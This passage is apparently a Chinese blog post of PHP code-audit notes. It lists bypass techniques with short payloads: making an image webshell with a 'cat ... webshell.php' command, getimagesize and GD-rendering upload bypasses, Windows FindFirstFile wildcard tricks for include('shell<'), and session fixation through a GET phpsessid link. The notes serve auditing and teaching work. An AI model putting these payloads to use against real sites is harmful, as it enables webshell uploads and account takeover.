<h2 id="优先级绕过"><a href="#优先级绕过" class="headerlink" title="优先级绕过"></a>优先级绕过</h2><p>原理：<br>如果运算符优先级相同，那运算符的结合方向决定了该如何运算<br><a href="http://php.net/manual/zh/language.operators.precedence.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.precedence.php</a></p>
<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ($test = true) and false; $test2 = (true &amp;&amp; false);</span></span><br><span class="line">$test = <span class="keyword">true</span> <span class="keyword">and</span> <span class="keyword">false</span>; var_dump($test);<span class="comment">//bool(true) </span></span><br><span class="line">$test2 = <span class="keyword">true</span> &amp;&amp; <span class="keyword">false</span>; var_dump($test2); <span class="comment">//bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</span></span><br><span class="line">$test3 = is_numeric(<span class="string">"123"</span>) <span class="keyword">and</span> is_numeric(<span class="string">"anything false"</span>); var_dump($test3); <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
<h2 id="getimagesize图片判断绕过"><a href="#getimagesize图片判断绕过" class="headerlink" title="getimagesize图片判断绕过"></a>getimagesize图片判断绕过</h2><p>原理：<br>当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。<br>只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>
<p>生成小马图的方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat image.png webshell.php &gt; image.php</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 找上传点</span></span><br><span class="line"><span class="comment">## 文件头部加入GIF89a</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">$file = $request-&gt;getFiles();</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="keyword">if</span>(getimagesize($files[<span class="string">'users'</span>][<span class="string">'photo'</span>][<span class="string">'tmp_name'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">          move_uploaded_file($files[<span class="string">'users'</span>][<span class="string">'photo'</span>][<span class="string">'tmp_name'</span>], $filename);</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">$filesize = @getimagesize(<span class="string">'/path/to/image.png'</span>);</span><br><span class="line"><span class="keyword">if</span> ($filesize) &#123;</span><br><span class="line">    do_upload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="lt-变-，windows-findfirstfile利用"><a href="#lt-变-，windows-findfirstfile利用" class="headerlink" title="&lt;变*，windows findfirstfile利用"></a>&lt;变*，windows findfirstfile利用</h2><p>原理：<br>Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。<br>执行过程中，字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。<br>所以：</p>
<ol>
<li>“&gt;””&gt;&gt;”可代替一个字符,”&lt;”可以代替后缀多个字符，”&lt;&lt;”可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>
<li>“ 可以代替.</li>
<li>文件名第一个字符是”.”的话，读取时可以忽略之</li>
</ol>
<table>
<thead>
<tr>
<th>NO</th>
<th>Status</th>
<th>Function</th>
<th>Type of operation</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.</td>
<td>OK</td>
<td>include()</td>
<td>Includefile</td>
</tr>
<tr>
<td>2.</td>
<td>OK</td>
<td>include_once()</td>
<td>Includefile</td>
</tr>
<tr>
<td>3.</td>
<td>OK</td>
<td>require()</td>
<td>Includefile</td>
</tr>
<tr>
<td>4.</td>
<td>OK</td>
<td>require_once()</td>
<td>Include file</td>
</tr>
<tr>
<td>5.</td>
<td>OK</td>
<td>fopen()</td>
<td>Openfile</td>
</tr>
<tr>
<td>6.</td>
<td>OK</td>
<td>ZipArchive::open()</td>
<td>Archive file</td>
</tr>
<tr>
<td>7.</td>
<td>OK</td>
<td>copy()</td>
<td>Copyfile</td>
</tr>
<tr>
<td>8.</td>
<td>OK</td>
<td>file_get_contents()</td>
<td>Readfile</td>
</tr>
<tr>
<td>9.</td>
<td>OK</td>
<td>parse_ini_file()</td>
<td>Readfile</td>
</tr>
<tr>
<td>10.</td>
<td>OK</td>
<td>readfile()</td>
<td>Readfile</td>
</tr>
<tr>
<td>11.</td>
<td>OK</td>
<td>file_put_contents()</td>
<td>Write file</td>
</tr>
<tr>
<td>12.</td>
<td>OK</td>
<td>mkdir()</td>
<td>New directory creation</td>
</tr>
<tr>
<td>13.</td>
<td>OK</td>
<td>tempnam()</td>
<td>New file creation</td>
</tr>
<tr>
<td>14.</td>
<td>OK</td>
<td>touch()</td>
<td>New file creation</td>
</tr>
<tr>
<td>15.</td>
<td>OK</td>
<td>move_uploaded_file()</td>
<td>Move operation</td>
</tr>
<tr>
<td>16.</td>
<td>OK</td>
<td>opendiit)</td>
<td>Directory operation</td>
</tr>
<tr>
<td>17.</td>
<td>OK</td>
<td>readdir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>18.</td>
<td>OK</td>
<td>rewinddir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>19.</td>
<td>OK</td>
<td>closedir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>20.</td>
<td>FAIL</td>
<td>rename()</td>
<td>Move operation</td>
</tr>
<tr>
<td>21.</td>
<td>FAIL</td>
<td>unlink()</td>
<td>Delete file</td>
</tr>
<tr>
<td>22.</td>
<td>FAIL</td>
<td>rmdir())</td>
<td>Directory operation</td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ?file=1&lt;</span></span><br><span class="line"><span class="comment">## ?file=1&gt;</span></span><br><span class="line"><span class="comment">## ?file=1"txt</span></span><br><span class="line">文件名为<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="comment">## ?file=1234.tx&gt;</span></span><br><span class="line"><span class="comment">## ?file=1234.&lt;</span></span><br><span class="line"><span class="comment">## ?file=1&lt;&lt;</span></span><br><span class="line"><span class="comment">## ?file=1&lt;&lt;"&gt;</span></span><br><span class="line"><span class="comment">## ?file=123&gt;"&gt;</span></span><br><span class="line"><span class="comment">## ?file=&gt;&gt;&gt;4"&gt;</span></span><br><span class="line"><span class="comment">## ?file=&lt;&lt;4"&gt;</span></span><br><span class="line">文件名为<span class="number">1234.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'shell&lt;'</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">'shell&lt;&lt;'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'shell.p&gt;p'</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">'shell"php'</span>);</span><br><span class="line">fopen(<span class="string">'.htacess'</span>);  <span class="comment">//==&gt;fopen("htacess');</span></span><br><span class="line">file_get_contents(<span class="string">'C:boot.ini'</span>); <span class="comment">//==&gt;  file_get_contents ('C:/boot.ini');</span></span><br><span class="line">file_get_contents(<span class="string">'C:/tmp/con.jpg'</span>); <span class="comment">//此举将会无休无止地从CON设备读取0字节，直到遇到eof</span></span><br><span class="line">file_put_contents(<span class="string">'C:/tmp/con.jpg'</span>,chr(<span class="number">0</span>×<span class="number">07</span>));  <span class="comment">//此举将会不断地使服务器发出类似哔哔的声音</span></span><br></pre></td></tr></table></figure>
<h2 id="处理value没有处理key"><a href="#处理value没有处理key" class="headerlink" title="处理value没有处理key"></a>处理value没有处理key</h2><p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>
<h2 id="用来目录遍历的特别函数"><a href="#用来目录遍历的特别函数" class="headerlink" title="用来目录遍历的特别函数"></a>用来目录遍历的特别函数</h2><p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094" target="_blank" rel="noopener">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a><br>lstat 函数</p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071" target="_blank" rel="noopener">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a><br>stream_resolve_include_path函数</p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688" target="_blank" rel="noopener">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457" target="_blank" rel="noopener">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453" target="_blank" rel="noopener">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>
<h2 id="绕过GD库图片渲染"><a href="#绕过GD库图片渲染" class="headerlink" title="绕过GD库图片渲染"></a>绕过GD库图片渲染</h2><p><a href="file/PHP代码审计_jpg_payload.zip">jpg_payload.zip</a></p>
<p>jpg_name.jpg是待GD处理的图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php &lt;jpg_name.jpg&gt;</span><br></pre></td></tr></table></figure></p>
<p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    imagecreatefromjpeg(<span class="string">'xxxx.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'phpsessid'</span>])) session_id($_GET[<span class="string">'phpsessid'</span>]);<span class="comment">//通过GET方法传递sessionid</span></span><br></pre></td></tr></table></figure>
<p>通过get方法来设置session。所以可以通过CSRF：</p>
<p><a href="http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123" target="_blank" rel="noopener">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>
<p>管理员点了我们就能使用此session进后台了。</p>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p>PHP代码审计分段讲解</p>
<p><a href="https://github.com/bowu678/php_bugs" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs</a></p>
<p><a href="https://github.com/jiangsir404/Audit-Learning" target="_blank" rel="noopener">https://github.com/jiangsir404/Audit-Learning</a></p>
<p><a href="https://read.douban.com/reader/ebook/16642056/" target="_blank" rel="noopener">https://read.douban.com/reader/ebook/16642056/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Qug_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.qugcloud.cn/2017/12/19/php-code-read/">https://www.qugcloud.cn/2017/12/19/php-code-read/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.qugcloud.cn" target="_blank">Qug's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/安全/">安全</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="social-share" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/01/19/mysql-primary-key/"><i class="fa fa-chevron-left">  </i><span>MySql自增主键归零的方法</span></a></div><div class="next-post pull-right"><a href="/2017/11/19/url-encoding/"><span>URL编码表 | Base64编码表</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By Qug_</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="icp"><a><span>苏ICP备16063739号-1</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>